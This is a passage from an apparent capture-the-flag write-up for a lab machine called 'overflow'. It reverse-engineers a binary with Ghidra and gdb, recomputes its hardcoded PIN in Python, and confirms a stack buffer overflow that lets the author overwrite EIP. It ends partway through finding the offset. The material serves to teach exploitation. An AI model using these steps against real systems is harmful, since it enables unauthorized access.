+tester@overflow:/opt/file_encrypt$ </pre><pre class="hljs"><code>tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt</span><span class="hljs-variable">$ </span>./file_encrypt 
+This is the code <span class="hljs-number">1804289383</span>. Enter the <span class="hljs-symbol">Pin:</span> asdfasdfasfasdfasdfasdfsa
+Wrong Pin
+tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt</span><span class="hljs-variable">$ </span></code></pre></div>
+<p>I tried passing varying lengths and characters to the PIN field in the hopes of crashing the application and perhaps finding a buffer overflow, but no matter what I entered, it simply said <code class="inline-code">Wrong Pin</code> and exited.</p>
+<p>so let's bring the file back to our machine so we can reverse it.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ scp -i ../ssh_keys/tester tester@overflow:/opt/file_encrypt/file_encrypt ./file_encrypt                                       [21-11-15 13:36:34]
+file_encrypt                                                                                                        100%   12KB 232.8KB/s   00:00   </pre><pre class="hljs"><code><span class="hljs-variable">$ </span>scp -i ../ssh_keys/tester tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt/file_encrypt</span> ./file_encrypt                                       [<span class="hljs-number">21</span><span class="hljs-number">-11</span><span class="hljs-number">-15</span> <span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">36</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span>]
+file_encrypt                                                                                                        <span class="hljs-number">100</span>%   <span class="hljs-number">12</span>KB <span class="hljs-number">232.8</span>KB/s   <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span>   </code></pre></div>
+<p>Using Ghidra, we can see some e functions.<br>
+<img src="_resources/5a77fa33c3c04c208d1b0caeb393af0a.png" alt="888e508254cffc68b796c63c5c3cb199.png"></p>
+<p>Let's start with the check_pin function.  Perhaps we can reverse the code to determine a valid PIN.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">void check_pin(void)
+
+{
+  undefined local_2c [20];
+  int local_18;
+  long local_14;
+  int local_10;
+  
+  local_10 = rand();
+  local_14 = random();
+  printf(&quot;This is the code %i. Enter the Pin: &quot;,local_10);
+  __isoc99_scanf(&amp;DAT_00010d1d,&amp;local_18);
+  if (local_14 == local_18) {
+    printf(&quot;name: &quot;);
+    __isoc99_scanf(&amp;DAT_00010c63,local_2c);
+    puts(
+        &quot;Thanks for checking. You can give your feedback for improvements at developer@overflow.htb&quot;
+        );
+  }
+  else {
+    puts(&quot;Wrong Pin&quot;);
+  }
+  return;
+}</pre><pre class="hljs"><code><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">check_pin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+
+</span>{
+  undefined local_2c [<span class="hljs-number">20</span>];
+  <span class="hljs-type">int</span> local_18;
+  <span class="hljs-type">long</span> local_14;
+  <span class="hljs-type">int</span> local_10;
+  
+  local_10 = <span class="hljs-built_in">rand</span>();
+  local_14 = <span class="hljs-built_in">random</span>();
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is the code %i. Enter the Pin: &quot;</span>,local_10);
+  __isoc99_scanf(&amp;DAT_00010d1d,&amp;local_18);
+  <span class="hljs-keyword">if</span> (local_14 == local_18) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;name: &quot;</span>);
+    __isoc99_scanf(&amp;DAT_00010c63,local_2c);
+    <span class="hljs-built_in">puts</span>(
+        <span class="hljs-string">&quot;Thanks for checking. You can give your feedback for improvements at developer@overflow.htb&quot;</span>
+        );
+  }
+  <span class="hljs-keyword">else</span> {
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong Pin&quot;</span>);
+  }
+  <span class="hljs-keyword">return</span>;
+}</code></pre></div>
+<p>The code looks fairly straightfoward.  The PIN we enter is stored in the <code class="inline-code">local_18</code> variable and then compared to <code class="inline-code">local_14</code>.  If they match, we have the correct PIN.</p>
+<p><code class="inline-code">local_14</code> is generated through the <code class="inline-code">random()</code> function.  Let's look at it.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">long random(void)
+
+{
+  uint in_stack_00000004;
+  uint local_c;
+  int local_8;
+  
+  __x86.get_pc_thunk.ax();
+  local_c = 0x6b8b4567;
+  local_8 = 0;
+  while (local_8 &lt; 10) {
+    local_c = local_c * 0x59 + 0x14;
+    local_8 = local_8 + 1;
+  }
+  return local_c ^ in_stack_00000004;
+}</pre><pre class="hljs"><code><span class="hljs-function"><span class="hljs-built_in">long</span> <span class="hljs-title">random</span>(<span class="hljs-params"><span class="hljs-keyword">void</span></span>)</span>
+
+{
+  <span class="hljs-built_in">uint</span> in_stack_00000004;
+  <span class="hljs-built_in">uint</span> local_c;
+  <span class="hljs-built_in">int</span> local_8;
+  
+  __x86.get_pc_thunk.ax();
+  local_c = <span class="hljs-number">0x6b8b4567</span>;
+  local_8 = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">while</span> (local_8 &lt; <span class="hljs-number">10</span>) {
+    local_c = local_c * <span class="hljs-number">0x59</span> + <span class="hljs-number">0x14</span>;
+    local_8 = local_8 + <span class="hljs-number">1</span>;
+  }
+  <span class="hljs-keyword">return</span> local_c ^ in_stack_00000004;
+}</code></pre></div>
+<p>This is the function that creates the PIN.  In theory, we should be able to replicate this code elsewhere and generate a working PIN.</p>
+<p>We'll do this in python and run it on the server.</p>
+<p>There are a few gotcha's in this function.  First, was not able to decompile the first variable correctly, leaving us with <code class="inline-code">in_stack_00000004</code>.  We need to identify this value since we will be xor'ing it with the local_c value below.</p>
+<p>To get this value, we use <code class="inline-code">gdb</code> to set a breakpoint at the function return, and then we examine the value in memory at that location.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="$" data-joplin-source-open="```$&#10;" data-joplin-source-close="&#10;```">GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
+Copyright (C) 2021 Free Software Foundation, Inc.                                        
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type &quot;show copying&quot; and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;x86_64-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
+Reading symbols from loot/file_encrypt...
+(No debugging symbols found in loot/file_encrypt)
+(gdb) disas random
+Dump of assembler code for function random:
+   0x0000081d &lt;+0&gt;:     push   %ebp
+   0x0000081e &lt;+1&gt;:     mov    %esp,%ebp
+   0x00000820 &lt;+3&gt;:     sub    $0x10,%esp
+   0x00000823 &lt;+6&gt;:     call   0xb90 &lt;__x86.get_pc_thunk.ax&gt;
+   0x00000828 &lt;+11&gt;:    add    $0x2778,%eax
+   0x0000082d &lt;+16&gt;:    movl   $0x6b8b4567,-0x8(%ebp)
+   0x00000834 &lt;+23&gt;:    movl   $0x0,-0x4(%ebp)
+   0x0000083b &lt;+30&gt;:    jmp    0x84d &lt;random+48&gt;
+   0x0000083d &lt;+32&gt;:    mov    -0x8(%ebp),%eax
+   0x00000840 &lt;+35&gt;:    imul   $0x59,%eax,%eax
+   0x00000843 &lt;+38&gt;:    add    $0x14,%eax
+   0x00000846 &lt;+41&gt;:    mov    %eax,-0x8(%ebp)
+   0x00000849 &lt;+44&gt;:    addl   $0x1,-0x4(%ebp)
+   0x0000084d &lt;+48&gt;:    cmpl   $0x9,-0x4(%ebp)
+   0x00000851 &lt;+52&gt;:    jle    0x83d &lt;random+32&gt;
+   0x00000853 &lt;+54&gt;:    mov    -0x8(%ebp),%eax
+   0x00000856 &lt;+57&gt;:    xor    0x8(%ebp),%eax
+   0x00000859 &lt;+60&gt;:    leave  
+   0x0000085a &lt;+61&gt;:    ret    
+End of assembler dump.</pre><pre class="hljs"><code>GNU gdb (Debian <span class="hljs-number">10.1</span><span class="hljs-number">-2</span>) <span class="hljs-number">10.1</span>.<span class="hljs-number">90.20210103</span>-git
+Copyright (C) <span class="hljs-number">2021</span> Free Software Foundation<span class="hljs-punctuation">,</span> Inc.                                        
+License GPLv<span class="hljs-number">3</span>+: GNU GPL version <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is <span class="hljs-keyword">free</span> software: you are <span class="hljs-keyword">free</span> <span class="hljs-keyword">to</span> change <span class="hljs-keyword">and</span> redistribute it.
+There is NO WARRANTY<span class="hljs-punctuation">,</span> <span class="hljs-keyword">to</span> the extent permitted by law.
+Type <span class="hljs-string">&quot;show copying&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;show warranty&quot;</span> for details.
+This GDB was configured as <span class="hljs-string">&quot;x86_64-linux-gnu&quot;</span>.
+Type <span class="hljs-string">&quot;show configuration&quot;</span> for configuration details.
+For bug reporting instructions<span class="hljs-punctuation">,</span> please see:
+&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual <span class="hljs-keyword">and</span> other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+
+For help<span class="hljs-punctuation">,</span> <span class="hljs-keyword">type</span> <span class="hljs-string">&quot;help&quot;</span>.
+Type <span class="hljs-string">&quot;apropos word&quot;</span> <span class="hljs-keyword">to</span> search for commands related <span class="hljs-keyword">to</span> <span class="hljs-string">&quot;word&quot;</span>...
+Reading symbols from loot/file_encrypt...
+(No debugging symbols found in loot/file_encrypt)
+(gdb) disas random
+Dump of assembler code for function random:
+   <span class="hljs-number">0x0000081d</span> &lt;+<span class="hljs-number">0</span>&gt;:     push   <span class="hljs-variable">%ebp</span>
+   <span class="hljs-number">0x0000081e</span> &lt;+<span class="hljs-number">1</span>&gt;:     mov    <span class="hljs-variable">%esp</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%ebp</span>
+   <span class="hljs-number">0x00000820</span> &lt;+<span class="hljs-number">3</span>&gt;:     <span class="hljs-keyword">sub</span>    $<span class="hljs-number">0x10</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%esp</span>
+   <span class="hljs-number">0x00000823</span> &lt;+<span class="hljs-number">6</span>&gt;:     <span class="hljs-keyword">call</span>   <span class="hljs-number">0xb90</span> &lt;__x<span class="hljs-number">86</span>.get_pc_thunk.ax&gt;
+   <span class="hljs-number">0x00000828</span> &lt;+<span class="hljs-number">11</span>&gt;:    <span class="hljs-keyword">add</span>    $<span class="hljs-number">0x2778</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%eax</span>
+   <span class="hljs-number">0x0000082d</span> &lt;+<span class="hljs-number">16</span>&gt;:    movl   $<span class="hljs-number">0x6b8b4567</span><span class="hljs-punctuation">,</span><span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>(<span class="hljs-variable">%ebp</span>)
+   <span class="hljs-number">0x00000834</span> &lt;+<span class="hljs-number">23</span>&gt;:    movl   $<span class="hljs-number">0x0</span><span class="hljs-punctuation">,</span><span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">4</span>(<span class="hljs-variable">%ebp</span>)
+   <span class="hljs-number">0x0000083b</span> &lt;+<span class="hljs-number">30</span>&gt;:    jmp    <span class="hljs-number">0x84d</span> &lt;random+<span class="hljs-number">48</span>&gt;
+   <span class="hljs-number">0x0000083d</span> &lt;+<span class="hljs-number">32</span>&gt;:    mov    <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>(<span class="hljs-variable">%ebp</span>)<span class="hljs-punctuation">,</span><span class="hljs-variable">%eax</span>
+   <span class="hljs-number">0x00000840</span> &lt;+<span class="hljs-number">35</span>&gt;:    imul   $<span class="hljs-number">0x59</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%eax</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%eax</span>
+   <span class="hljs-number">0x00000843</span> &lt;+<span class="hljs-number">38</span>&gt;:    <span class="hljs-keyword">add</span>    $<span class="hljs-number">0x14</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%eax</span>
+   <span class="hljs-number">0x00000846</span> &lt;+<span class="hljs-number">41</span>&gt;:    mov    <span class="hljs-variable">%eax</span><span class="hljs-punctuation">,</span><span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>(<span class="hljs-variable">%ebp</span>)
+   <span class="hljs-number">0x00000849</span> &lt;+<span class="hljs-number">44</span>&gt;:    addl   $<span class="hljs-number">0x1</span><span class="hljs-punctuation">,</span><span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">4</span>(<span class="hljs-variable">%ebp</span>)
+   <span class="hljs-number">0x0000084d</span> &lt;+<span class="hljs-number">48</span>&gt;:    cmpl   $<span class="hljs-number">0x9</span><span class="hljs-punctuation">,</span><span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">4</span>(<span class="hljs-variable">%ebp</span>)
+   <span class="hljs-number">0x00000851</span> &lt;+<span class="hljs-number">52</span>&gt;:    jle    <span class="hljs-number">0x83d</span> &lt;random+<span class="hljs-number">32</span>&gt;
+   <span class="hljs-number">0x00000853</span> &lt;+<span class="hljs-number">54</span>&gt;:    mov    <span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">8</span>(<span class="hljs-variable">%ebp</span>)<span class="hljs-punctuation">,</span><span class="hljs-variable">%eax</span>
+   <span class="hljs-number">0x00000856</span> &lt;+<span class="hljs-number">57</span>&gt;:    <span class="hljs-keyword">xor</span>    <span class="hljs-number">0x8</span>(<span class="hljs-variable">%ebp</span>)<span class="hljs-punctuation">,</span><span class="hljs-variable">%eax</span>
+   <span class="hljs-number">0x00000859</span> &lt;+<span class="hljs-number">60</span>&gt;:    leave  
+   <span class="hljs-number">0x0000085a</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">ret</span>    
+End of assembler dump.</code></pre></div>
+<p>Here we disassemble the random() function.  Next we set a breakpoint at offset 57, where we xor our values.  The end result of the xor operation is returned by the function.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">(gdb) b * random+57
+Breakpoint 1 at 0x856
+(gdb) 
+</pre><pre class="hljs"><code>(gdb) <span class="hljs-keyword">b </span>* <span class="hljs-built_in">random</span>+<span class="hljs-number">57</span>
+<span class="hljs-keyword">Breakpoint </span><span class="hljs-number">1</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x856</span>
+(gdb) 
+</code></pre></div>
+<p>Now we run the program until the breakpoint is reached.  Once there, we can examine the value at the memory location, which would be 0x8(%ebp) or,written differently, ebp+8.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">(gdb) r
+Starting program: /home/kali/Targets/overflow/loot/file_encrypt 
+
+Breakpoint 1, 0x56555856 in random ()
+(gdb) x /10x $ebp +8
+0xffffd060:     0x6b8b4567      0x56557fa0      0xf7fad000      0x56555ac7
+0xffffd070:     0xf7fad000      0xf7fe2280      0x00000000      0xf7dfad3e
+0xffffd080:     0xf7fad3fc      0x56557fa0</pre><pre class="hljs"><code>(gdb) r
+Starting program: /home/kali/Targets/overflow/loot/file_encrypt 
+
+Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x56555856</span> <span class="hljs-keyword">in</span> random ()
+(gdb) x /10x $<span class="hljs-built_in">ebp</span> +<span class="hljs-number">8</span>
+<span class="hljs-number">0xffffd060</span>:     <span class="hljs-number">0x6b8b4567</span>      <span class="hljs-number">0x56557fa0</span>      <span class="hljs-number">0xf7fad000</span>      <span class="hljs-number">0x56555ac7</span>
+<span class="hljs-number">0xffffd070</span>:     <span class="hljs-number">0xf7fad000</span>      <span class="hljs-number">0xf7fe2280</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7dfad3e</span>
+<span class="hljs-number">0xffffd080</span>:     <span class="hljs-number">0xf7fad3fc</span>      <span class="hljs-number">0x56557fa0</span></code></pre></div>
+<p>The value at that address is the same value passed to local_c.  So essentially in our code, we'll need to xor the final local_c value against the original local_c value.</p>
+<p>The other issue is that the return value from the random function is a type long integer.  Because our input value in <code class="inline-code">check_pin</code> is a signed int type, we need to cast the return value from <code class="inline-code">random</code> as a signed int, otherwise the values will never match.  Python3 does not differentiate between long and int values natively, so to do the conversion we need to include the <code class="inline-code">ctypes</code> import in our code.</p>
+<p>The final PIN generation code is:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">#!/usr/bin/python3
+
+import ctypes
+
+local_c_initial = 0x6b8b4567
+local_c = 0x6b8b4567
+local_8 = 0
+
+while (local_8 &lt;10):
+    local_c = local_c * 0x59 + 0x14
+    local_8 = local_8 + 1
+    
+PIN = ctypes.c_int(local_c ^ local_c_initial).value 
+print(&quot;The PIN code is: &quot;, PIN)</pre><pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python3</span>
+
+<span class="hljs-attribute">import</span> ctypes
+
+<span class="hljs-attribute">local_c_initial</span> = <span class="hljs-number">0</span>x6b8b4567
+<span class="hljs-attribute">local_c</span> = <span class="hljs-number">0</span>x6b8b4567
+<span class="hljs-attribute">local_8</span> = <span class="hljs-number">0</span>
+
+<span class="hljs-attribute">while</span> (local_8 &lt;<span class="hljs-number">10</span>):
+    <span class="hljs-attribute">local_c</span> = local_c * <span class="hljs-number">0</span>x59 + <span class="hljs-number">0</span>x14
+    <span class="hljs-attribute">local_8</span> = local_8 + <span class="hljs-number">1</span>
+    
+<span class="hljs-attribute">PIN</span> = ctypes.c_int(local_c ^ local_c_initial).value 
+<span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;The PIN code is: &quot;</span>, PIN)</code></pre></div>
+<p>Running the python script generates a PIN code</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ exploits/generate_pin.py                           
+The PIN code is:  -202976456
+</pre><pre class="hljs"><code>$ exploits/generate_pin<span class="hljs-selector-class">.py</span>                           
+The PIN <span class="hljs-selector-tag">code</span> is:  -<span class="hljs-number">202976456</span>
+</code></pre></div>
+<p>And the PIN is valid!  We're presented with a <code class="inline-code">name</code> prompt.  I chose to enter a filename in the field and the program exited with a thank you message.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">This is the code 1804289383. Enter the Pin: -202976456
+name: /etc/passwd
+Thanks for checking. You can give your feedback for improvements at developer@overflow.htb</pre><pre class="hljs"><code>This <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> code <span class="hljs-number">1804289383.</span> Enter <span class="hljs-keyword">the</span> Pin: <span class="hljs-number">-202976456</span>
+<span class="hljs-built_in">name</span>: /etc/passwd
+Thanks <span class="hljs-keyword">for</span> checking. You can give your feedback <span class="hljs-keyword">for</span> improvements <span class="hljs-keyword">at</span> developer@overflow.htb</code></pre></div>
+<p>However, if we repeat the exercise and this time enter a large value into the <code class="inline-code">name</code> field, the program crashes with a segmentation fault.  The segementation fault is indicitive of a possible buffer overflow condition.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">This is the code 1804289383. Enter the Pin: -202976456
+name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
+zsh: segmentation fault  loot/file_encrypt</pre><pre class="hljs"><code>This <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> code <span class="hljs-number">1804289383.</span> Enter <span class="hljs-keyword">the</span> Pin: <span class="hljs-number">-202976456</span>
+<span class="hljs-built_in">name</span>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Thanks <span class="hljs-keyword">for</span> checking. You can give your feedback <span class="hljs-keyword">for</span> improvements <span class="hljs-keyword">at</span> developer@overflow.htb
+zsh: segmentation fault  loot/file_encrypt</code></pre></div>
+<p>To validate, we run the program inside the <code class="inline-code">gdb</code> debugger.  Notice the memory address provided as the site of the segmentation fault is <code class="inline-code">0x41414141</code> which are the hex values for <code class="inline-code">AAAA</code>.  It appears our has overflowed into the EIP register.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ gdb loot/file_encrypt                                                                                                          [21-11-17 9:36:39]
+GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
+Copyright (C) 2021 Free Software Foundation, Inc.                                                                                                     
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type &quot;show copying&quot; and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;x86_64-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
+Reading symbols from loot/file_encrypt...
+(No debugging symbols found in loot/file_encrypt)
+(gdb) r
+Starting program: /home/kali/Targets/overflow/loot/file_encrypt 
+This is the code 1804289383. Enter the Pin: -202976456
+name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) </pre><pre class="hljs"><code>$ gdb loot/file_encrypt                                                                                                          [<span class="hljs-number">21</span>-<span class="hljs-number">11</span>-<span class="hljs-number">17</span> <span class="hljs-number">9</span>:<span class="hljs-number">36</span>:<span class="hljs-number">39</span>]
+GNU gdb (Debian <span class="hljs-number">10.1</span>-<span class="hljs-number">2</span>) <span class="hljs-number">10.1</span>.<span class="hljs-number">90.20210103</span>-git
+Copyright (C) <span class="hljs-number">2021</span> Free Software Foundation, Inc.                                                                                                     
+License GPLv3+: GNU GPL version <span class="hljs-number">3</span> or later &lt;http:<span class="hljs-regexp">//g</span>nu.org<span class="hljs-regexp">/licenses/g</span>pl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type <span class="hljs-string">&quot;show copying&quot;</span> and <span class="hljs-string">&quot;show warranty&quot;</span> <span class="hljs-keyword">for</span> details.
+This GDB was configured as <span class="hljs-string">&quot;x86_64-linux-gnu&quot;</span>.
+Type <span class="hljs-string">&quot;show configuration&quot;</span> <span class="hljs-keyword">for</span> configuration details.
+For bug reporting instructions, please see:
+&lt;https:<span class="hljs-regexp">//</span>www.gnu.org<span class="hljs-regexp">/software/g</span>db<span class="hljs-regexp">/bugs/</span>&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http:<span class="hljs-regexp">//</span>www.gnu.org<span class="hljs-regexp">/software/g</span>db<span class="hljs-regexp">/documentation/</span>&gt;.
+
+For help, type <span class="hljs-string">&quot;help&quot;</span>.
+Type <span class="hljs-string">&quot;apropos word&quot;</span> to search <span class="hljs-keyword">for</span> commands related to <span class="hljs-string">&quot;word&quot;</span>...
+Reading symbols from loot/file_encrypt...
+(No debugging symbols found <span class="hljs-keyword">in</span> loot/file_encrypt)
+(gdb) r
+Starting program: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Targets/</span>overflow<span class="hljs-regexp">/loot/</span>file_encrypt 
+This is the code <span class="hljs-number">1804289383</span>. Enter the Pin: -<span class="hljs-number">202976456</span>
+name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Thanks <span class="hljs-keyword">for</span> checking. You can give your feedback <span class="hljs-keyword">for</span> improvements at developer@overflow.htb
+
+Program received signal SIGSEGV, Segmentation fault.
+<span class="hljs-number">0</span>x41414141 <span class="hljs-keyword">in</span> ?? ()
+(gdb) </code></pre></div>
+<p>The next step is to find the offset for the EIP register.  If we're able to control the values placed in the register, we can take control of the programs operational flow and redirect it to our advantage.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</pre><pre class="hljs"><code>$ <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_create.rb -l <span class="hljs-number">300</span> 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</code></pre></div>
+<p>Using pattern_create, we generated a string of 300 characters.  We'll input it using gdb and then extract the EIP value.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">(gdb) r
+Starting program: /home/kali/Targets/overflow/loot/file_encrypt 
+This is the code 1804289383. Enter the Pin: -202976456
+name: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
+
+Program received signal SIGSEGV, Segmentation fault.
+0x35624134 in ?? ()
+(gdb) </pre><pre class="hljs"><code>(gdb) r
+Starting program: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Targets/</span>overflow<span class="hljs-regexp">/loot/</span>file_encrypt 
+<span class="hljs-keyword">This</span> is the code <span class="hljs-number">1804289383</span>. Enter the Pin: -<span class="hljs-number">202976456</span>
